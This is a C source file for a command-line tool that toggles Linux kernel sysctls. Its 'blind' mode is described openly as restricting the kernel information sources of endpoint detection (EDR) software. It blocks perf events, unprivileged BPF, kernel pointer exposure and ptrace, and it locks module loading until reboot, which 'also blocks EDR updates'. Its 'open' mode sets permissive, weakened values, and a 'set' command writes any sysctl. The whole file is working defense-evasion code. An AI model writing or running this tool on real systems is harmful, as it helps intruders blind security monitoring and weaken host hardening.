#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

static const struct { const char *path; const char *blind; const char *open; const char *desc; } CTLS[] = {
    {
        "/proc/sys/kernel/dmesg_restrict", "1", "0",
        "dmesg_restrict: 1 = unprivileged processes cannot read kernel ring buffer"
    },
    {
        "/proc/sys/kernel/kptr_restrict", "2", "0",
        "kptr_restrict: 2 = all /proc/kallsyms addresses hidden (0x0 for unprivileged + privileged)"
    },
    {
        "/proc/sys/kernel/perf_event_paranoid", "3", "-1",
        "perf_event_paranoid: 3 = block all perf_event_open (EDRs using perf lose visibility)"
    },
    {
        "/proc/sys/kernel/yama/ptrace_scope", "2", "0",
        "ptrace_scope: 2 = only CAP_SYS_PTRACE may ptrace any process"
    },
    {
        "/proc/sys/kernel/unprivileged_bpf_disabled", "1", "0",
        "unprivileged_bpf_disabled: 1 = CAP_BPF required for all BPF operations"
    },
    {
        "/proc/sys/net/core/bpf_jit_harden", "2", "0",
        "bpf_jit_harden: 2 = constant blinding even for privileged BPF programs"
    },
    {
        "/proc/sys/kernel/modules_disabled", "1", "0",
        "modules_disabled: 1 = no new kernel modules can be loaded (also blocks EDR updates)"
    },
    { NULL, NULL, NULL, NULL }
};

static void write_sysctl(const char *path, const char *val)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) { fprintf(stderr, "  [!] %s: %s\n", path, strerror(errno)); return; }
    write(fd, val, strlen(val));
    close(fd);
    printf("  [+] %s = %s\n", path, val);
}

static void read_sysctl(const char *path, char *out, size_t len)
{
    out[0] = '\0';
    FILE *f = fopen(path, "r");
    if (!f) { snprintf(out, len, "(error: %s)", strerror(errno)); return; }
    if (!fgets(out, (int)len, f)) out[0] = '\0';
    out[strcspn(out, "\n")] = '\0';
    fclose(f);
}

static void cmd_show(void)
{
    printf("%-50s  %-5s  %s\n", "sysctl", "value", "description");
    printf("%-50s  %-5s  %s\n", "-------", "-----", "-----------");
    for (int i = 0; CTLS[i].path; i++) {
        char val[32];
        read_sysctl(CTLS[i].path, val, sizeof(val));
        printf("%-50s  %-5s  %s\n",
               CTLS[i].path + strlen("/proc/sys/"), val, CTLS[i].desc);
    }
}

static void cmd_blind(int dry_run)
{
    printf("[*] applying blind configuration%s:\n", dry_run ? " (dry-run)" : "");
    for (int i = 0; CTLS[i].path; i++) {
        printf("  %s\n", CTLS[i].desc);
        if (!dry_run) write_sysctl(CTLS[i].path, CTLS[i].blind);
        else printf("    would set %s = %s\n", CTLS[i].path, CTLS[i].blind);
    }
    if (!dry_run) printf("[+] done - EDR kernel information sources restricted\n");
}

static void cmd_open(void)
{
    printf("[*] restoring permissive values:\n");
    for (int i = 0; CTLS[i].path; i++) {
        if (strcmp(CTLS[i].path, "/proc/sys/kernel/modules_disabled") == 0) continue;
        write_sysctl(CTLS[i].path, CTLS[i].open);
    }
    printf("[+] done (note: modules_disabled=1 is irreversible without reboot)\n");
}

static void cmd_set(const char *key, const char *val)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/sys/%s", key);
    write_sysctl(path, val);
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <show|blind|open|set>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "show") == 0) cmd_show();
    else if (strcmp(argv[1], "blind") == 0) {
        int dry = argc >= 3 && strcmp(argv[2], "--dry") == 0;
        cmd_blind(dry);
    } else if (strcmp(argv[1], "open") == 0) cmd_open();
    else if (strcmp(argv[1], "set") == 0 && argc >= 4) cmd_set(argv[2], argv[3]);
    else { fprintf(stderr, "unknown: %s\n", argv[1]); return 1; }

    return 0;
}
